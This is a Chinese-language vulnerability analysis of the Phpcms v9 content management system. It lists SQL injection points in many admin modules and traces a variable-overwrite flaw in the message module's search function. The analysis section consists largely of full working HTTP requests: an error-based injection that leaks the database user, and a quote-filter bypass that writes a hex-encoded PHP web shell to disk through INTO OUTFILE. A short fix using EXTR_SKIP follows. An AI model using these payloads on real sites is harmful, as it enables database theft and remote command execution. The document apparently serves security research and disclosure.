### SQL注入漏洞概述

在Phpcms多个模块中，存在SQL注入漏洞，主要表现为在`add`方法中的`insert`注入和`edit`方法中的`update`注入。以下是受影响的文件及其具体方法：

- `\phpcms\modules\poster\poster.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\poster\space.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\search\search_type.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\special\content.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\special\special.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\badword.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\category.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\copyfrom.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\ipbanned.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\keylink.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\menu.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\position.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\role.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入
- `\phpcms\modules\admin\urlrule.php`
  - `add`方法：`insert`注入
  - `edit`方法：`update`注入

### 变量覆盖导致的注入

在`\phpcms\modules\message\message.php`文件的`search_message`函数中，由于使用了`extract`函数，导致变量覆盖，从而引发SQL注入漏洞。

#### 漏洞分析

1. **初始化`$where`参数**
   - 第259行：初始化`$where`参数。
   - 第260行：将`$_POST['search']`中的键注册为变量。
   - 第280行：`$where`参数传入`listinfo`函数。

2. **`listinfo`函数**
   - 第58行：`$where`传入`count`函数。

3. **`count`函数**
   - 第142行：`$where`传入`get_one`函数。

4. **`get_one`函数**
   - 第140行：进入`execute`函数执行。

由于`extract`函数的关系，`$where`参数（通过`$_POST['search']['where']`）是可控的，可以构造一个不带单双引号的注入。

#### 请求示例

```http
POST /index.php?m=message&c=message&a=search_message&menuid=1620 HTTP/1.1
Host: 192.168.99.127
Content-Length: 208
Cache-Control: max-age=0
Origin: http://192.168.99.127
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: http://192.168.99.127/index.php?m=message&c=message&a=init&menuid=1620&pc_hash=0rStVl
Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
Cookie: 
Connection: close

search[status]=&search[username]=todaro&search[start_time]=&search[end_time]=&dosubmit=%CB%D1%CB%F7&pc_hash=0rStVl&search[where]=1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23
```

最终执行的数据库语句为：
```sql
SELECT COUNT(*) AS num FROM `phpcmsv9`.`v9_message` WHERE 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))# AND send_from_id='todaro' or send_to_id='todaro'
```

#### 绕过全局过滤

Phpcms的全局处理会过滤`$where`参数中的单双引号。但是，可以通过以下方式绕过过滤：

- 在`listinfo`函数将`$where`参数传入`count`函数后，`$where`会被`to_sqls`函数进行处理。
- `to_sqls`函数会判断传入的参数，如果是数组，会分别将键值对取出来，键只添加反引号，而值会加单引号。

因此，如果能给`to_sqls`函数传入数组，那么在键中就可以加入单双引号。

#### 重新构造请求

```http
POST /index.php?m=message&c=message&a=search_message&menuid=1620 HTTP/1.1
Host: 192.168.99.127
Content-Length: 333
Cache-Control: max-age=0
Origin: http://192.168.99.127
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: http://192.168.99.127/index.php?m=message&c=message&a=init&menuid=1620&pc_hash=xxxxx
Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
Cookie: 
Connection: close

search[status]=&search[username]=&search[start_time]=1&search[end_time]=&dosubmit=%CB%D1%CB%F7&pc_hash=xxxxx&search[where][replyid`/**//**/union/**/select/**/0x3c3f706870204061737365727428245f4745545b27636d64275d293b3f3e/**/into/**/outfile/**/'C:/www/cms/phpcms_v9.6.3_GBK/phpcms/modules/message/1.php'%23]=1
```

如果当前数据库用户有写权限，即可生成`/phpcms/modules/message/1.php`文件。

#### 权限及位置

- **位置**：模块 > 模块列表 > 短消息 >“搜索处”
- **设置该权限**：设置 > 管理员设置 > 角色管理 > 权限设置 > 模块 > 模块列表 > 短消息

短消息功能对于后台用户（总编、编辑、运营总监、发布人员、站点管理员、超级管理员）来说，赋予其这个权限应该不算太高。

### 修复建议

修改`\phpcms\modules\message\message.php`文件：

```php
// 第260行
extract($_POST['search'], EXTR_SKIP);
```

修改后即可防止变量覆盖，无法getshell。

### 其他受影响文件

- `\phpcms\modules\pay\payment.php`
  - `pay_list`函数
  - `pay_stat`函数
- `\phpcms\modules\admin\ipbanned.php`
  - `search_ip`函数
- `\phpcms\modules\attachment\manage.php`
  - `init`函数

这些文件同样因为变量覆盖导致SQL注入漏洞，不再赘述。

### CSRF与XSS

- **CSRF防御**：Phpcms后台操作会验证`pc_hash`值，用于防止CSRF攻击。
- **前台XSS**：Phpcms前台用户的操作很有限，难以找到XSS漏洞。
- **后台反射型XSS**：虽然找到了后台反射型XSS，但由于需要`pc_hash`值才能触发，形成悖论。

### 总结

Phpcms多个模块存在SQL注入漏洞，主要是由于变量覆盖导致。通过修改代码并使用`EXTR_SKIP`选项可以防止变量覆盖。同时，需要注意CSRF和XSS的防护，以提高系统的安全性。